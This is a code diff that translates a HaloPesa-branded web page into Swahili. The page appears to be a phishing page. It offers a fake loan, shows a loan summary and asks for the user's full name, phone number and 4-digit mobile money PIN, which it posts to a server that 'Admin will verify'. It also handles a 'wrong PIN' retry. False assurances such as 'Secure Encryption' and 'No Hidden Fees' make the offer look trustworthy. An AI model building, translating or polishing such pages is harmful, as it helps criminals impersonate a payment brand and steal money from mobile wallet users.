@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HaloPesa - Verify PIN</title>
+    <title>HaloPesa - Thibitisha PIN</title>
     <style>
         :root {
             --hp-orange: #FF5A1F;
@@ -79,24 +79,24 @@
             </svg>
         </div>
         <div class="brand-name">HaloPesa</div>
-        <div class="header-sub">Verify your transaction</div>
+        <div class="header-sub">Thibitisha muamala wako</div>
         <div class="card">
-            <div class="card-title">📊 Loan Summary</div>
+            <div class="card-title">📊 Muhtasari wa Mkopo</div>
             <div class="loan-summary">
-                <div class="summary-item"><div class="label">Loan Amount</div><div class="value orange" id="summaryAmount">TZS 1,000,000</div></div>
-                <div class="summary-item"><div class="label">Term</div><div class="value" id="summaryTerm">3 Months</div></div>
-                <div class="summary-item"><div class="label">Monthly Payment</div><div class="value orange" id="summaryMonthly">TZS 336,115</div></div>
-                <div class="summary-item"><div class="label">Interest Rate</div><div class="value">5%</div></div>
+                <div class="summary-item"><div class="label">Kiasi cha Mkopo</div><div class="value orange" id="summaryAmount">TZS 1,000,000</div></div>
+                <div class="summary-item"><div class="label">Muda</div><div class="value" id="summaryTerm">3 Miezi</div></div>
+                <div class="summary-item"><div class="label">Malipo Kila Mwezi</div><div class="value orange" id="summaryMonthly">TZS 336,115</div></div>
+                <div class="summary-item"><div class="label">Kiwango cha Riba</div><div class="value">5%</div></div>
             </div>
         </div>
         <div class="card">
-            <div class="card-title">🔐 Verify Your PIN</div>
+            <div class="card-title">🔐 Thibitisha PIN yako</div>
             <p style="font-size:0.85rem; color:var(--gray); text-align:center; margin-bottom:12px;">
-                Enter your 4-digit phone PIN to authorize the payment
+                Ingiza PIN yako ya simu yenye tarakimu 4 ili kuidhinisha malipo
             </p>
             <div style="margin-bottom:16px;">
-                <div class="user-detail"><span class="label">Full Name</span><span class="value" id="displayName">---</span></div>
-                <div class="user-detail"><span class="label">Phone Number</span><span class="value" id="displayPhone">---</span></div>
+                <div class="user-detail"><span class="label">Jina Kamili</span><span class="value" id="displayName">---</span></div>
+                <div class="user-detail"><span class="label">Nambari Ya Simu</span><span class="value" id="displayPhone">---</span></div>
             </div>
             <form id="pinForm">
                 <div class="pin-container">
@@ -105,14 +105,14 @@
                     <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
                     <input type="password" class="pin-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
                 </div>
-                <button type="submit" class="btn-submit" id="submitBtn">Verify & Continue</button>
+                <button type="submit" class="btn-submit" id="submitBtn">Thibitisha na Uendelee</button>
                 <div id="formStatus" class="message hidden"></div>
             </form>
         </div>
         <div class="footer-features">
-            <span>🔒 Secure Encryption</span>
-            <span>⚡ 5-Minute Approval</span>
-            <span>💰 No Hidden Fees</span>
+            <span>🔒 Salama kwa Njia Fiche</span>
+            <span>⚡ Idhini ya Dakika 5</span>
+            <span>💰 Hakuna Ada Zilizofichwa</span>
         </div>
     </div>
     <script>
@@ -139,15 +139,15 @@
 
         function formatCurrency(num) { return 'TZS ' + Math.round(num).toLocaleString('en-US'); }
         document.getElementById('summaryAmount').textContent = formatCurrency(principal);
-        document.getElementById('summaryTerm').textContent = term + ' Months';
+        document.getElementById('summaryTerm').textContent = term + ' Miezi';
         document.getElementById('summaryMonthly').textContent = formatCurrency(monthlyPayment);
         document.getElementById('displayName').textContent = fullName;
         document.getElementById('displayPhone').textContent = phone;
 
-        // ✅ Handle wrong PIN error from redirect
+        // ✅ Ikiwa kuna hitilafu ya PIN mbaya
         if (error === 'wrong_pin') {
             const formStatus = document.getElementById('formStatus');
-            showMessage(formStatus, '❌ Incorrect PIN. Please try again.', 'error');
+            showMessage(formStatus, '❌ PIN uliyoingiza si sahihi. Tafadhali jaribu tena.', 'error');
             const pinBoxes = document.querySelectorAll('.pin-box');
             pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); b.classList.add('error'); });
             pinBoxes[0].focus();
@@ -188,14 +188,14 @@
             let pin = '';
             pinBoxes.forEach(box => pin += box.value.trim());
             if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
-                showMessage(formStatus, 'Please enter a complete 4-digit PIN.', 'error');
+                showMessage(formStatus, 'Tafadhali ingiza PIN kamili ya tarakimu 4.', 'error');
                 pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); b.classList.add('error'); });
                 pinBoxes[0].focus();
                 return;
             }
             hideMessage(formStatus);
             submitBtn.disabled = true;
-            submitBtn.innerHTML = '<span class="loader"></span> Processing...';
+            submitBtn.innerHTML = '<span class="loader"></span> Inasubiri...';
 
             try {
                 const response = await fetch('/api/submit_loan', {
@@ -213,17 +213,16 @@
                 });
                 const data = await response.json();
                 if (data.success) {
-                    showMessage(formStatus, '✅ Your application has been submitted! Admin will verify.', 'success');
+                    showMessage(formStatus, '✅ Ombi lako limetumwa! Mhudumu atalithibitisha.', 'success');
                     setTimeout(() => {
-                        // ✅ Pass ALL parameters to approve page
                         window.location.href = `/approve?app_id=${data.app_id}&amount=${amount}&months=${months}&phone=${phone}&fullName=${encodeURIComponent(fullName)}&employment=${employment}&income=${income}`;
                     }, 2000);
                 } else {
-                    showMessage(formStatus, '❌ Error: ' + (data.error || 'Please try again later.'), 'error');
+                    showMessage(formStatus, '❌ Hitilafu: ' + (data.error || 'Jaribu tena baadaye.'), 'error');
                     resetButton();
                 }
             } catch (err) {
-                showMessage(formStatus, '❌ Network error. Please try again.', 'error');
+                showMessage(formStatus, '❌ Hitilafu ya mtandao. Jaribu tena.', 'error');
                 resetButton();
             }
         });
@@ -236,7 +235,7 @@
         function hideMessage(el) { el.classList.add('hidden'); }
         function resetButton() {
             submitBtn.disabled = false;
-            submitBtn.textContent = 'Verify & Continue';
+            submitBtn.textContent = 'Thibitisha na Uendelee';
         }
     </script>
 </body>
